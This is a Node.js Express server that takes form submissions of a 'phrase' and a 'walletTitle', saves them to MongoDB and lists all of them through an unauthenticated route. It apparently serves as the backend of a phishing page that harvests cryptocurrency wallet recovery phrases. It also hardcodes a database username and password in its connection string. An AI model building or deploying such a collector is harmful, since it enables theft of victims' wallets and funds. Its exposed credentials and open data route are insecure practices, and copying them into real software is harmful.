const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const app = express();

app.use(express.urlencoded({ extended: true }));
const PORT = process.env.PORT || 3000;

const mongodb =
  "mongodb+srv://New-express-user_13:user_13@cluster0.6xyca.mongodb.net/Form?retryWrites=true&w=majority";
mongoose
  .connect(mongodb, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log("connected to MongoDB");
    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  })
  .catch((err) => console.log("Failed to connect to MongoDB", err));

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Define a schema for form data
const formSchema = new mongoose.Schema({
  phrase: String,
  walletTitle: String,
});

// Create a model for form submissions
const Form = mongoose.model("Form", formSchema);

// Handle form submissions
app.post("/submit-form", async (req, res) => {
  const { phrase, walletTitle } = req.body;

  // Create a new form entry
  const newForm = new Form({
    phrase,
    walletTitle,
  });

  try {
    // Save the form data to MongoDB
    await newForm.save();
    console.log("Form data saved to MongoDB");

    // Send a response back to the client
    res.json({
      message: "Form data received and saved successfully!",
      data: { phrase, walletTitle },
    });
  } catch (err) {
    console.error("Error saving form data:", err);
    res.status(500).json({ message: "Error saving form data" });
  }
});

// Route to get all form submissions
app.get("/forms", async (req, res) => {
  try {
    // Retrieve all form submissions from MongoDB
    const forms = await Form.find();
    res.json({
      message: "Form data retrieved successfully!",
      data: forms,
    });
  } catch (err) {
    console.error("Error retrieving form data:", err);
    res.status(500).json({ message: "Error retrieving form data" });
  }
});
